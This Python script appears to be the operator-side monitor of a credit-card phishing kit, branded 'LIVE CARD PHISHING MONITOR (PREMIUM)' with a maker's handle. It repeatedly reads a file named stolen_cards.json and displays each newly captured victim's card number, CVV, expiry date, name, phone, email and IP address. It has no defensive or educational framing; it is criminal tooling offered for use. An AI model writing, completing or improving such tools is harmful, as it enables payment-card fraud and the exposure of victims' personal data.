#!/usr/bin/env python3
import json
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)
DATA_FILE = "data/stolen_cards.json"

def show_monitor_banner():
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("  ███╗   ███╗ ██████╗ ███╗   ██╗██╗████████╗ ██████╗ ██████╗ ")
    print("  ████╗ ████║██╔═══██╗████╗  ██║██║╚══██╔══╝██╔═══██╗██╔══██╗")
    print("  ██╔████╔██║██║   ██║██╔██╗ ██║██║   ██║   ██║   ██║██████╔╝")
    print("  ██║╚██╔╝██║██║   ██║██║╚██╗██║██║   ██║   ██║   ██║██╔══██╗")
    print("  ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║   ██║   ╚██████╔╝██║  ██║")
    print("  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝")
    print(f"{Fore.GREEN}{Style.BRIGHT}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║   📡 LIVE CARD PHISHING MONITOR (PREMIUM)                   ║")
    print("║   🔥 Made by @the_babarrrr                                 ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")

def monitor():
    show_monitor_banner()
    print(f"{Fore.CYAN}⏳ Monitoring for cards...{Style.RESET_ALL}\n")
    last_count = 0
    while True:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
            if len(data) > last_count:
                new_count = len(data)
                print(f"\n{Fore.RED}{Style.BRIGHT}🔥 NEW CARD CAPTURED!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}📊 Total: {new_count}{Style.RESET_ALL}")
                latest = data[-1]
                print(f"{Fore.YELLOW}🕒 Time: {latest['timestamp']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🌐 IP: {latest['ip']}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💳 Card: {latest['card_number']}{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}🔐 CVV: {latest['cvv']}{Style.RESET_ALL}")
                print(f"{Fore.BLUE}📅 Expiry: {latest['expiry_date']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}👤 Name: {latest['name']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📱 Phone: {latest['phone']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📧 Email: {latest['email']}{Style.RESET_ALL}")
                print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
                last_count = new_count
            else:
                print(f"\r{Fore.CYAN}⏳ Waiting... {len(data)} cards so far{Style.RESET_ALL}", end="")
        time.sleep(2)

if __name__ == "__main__":
    monitor()
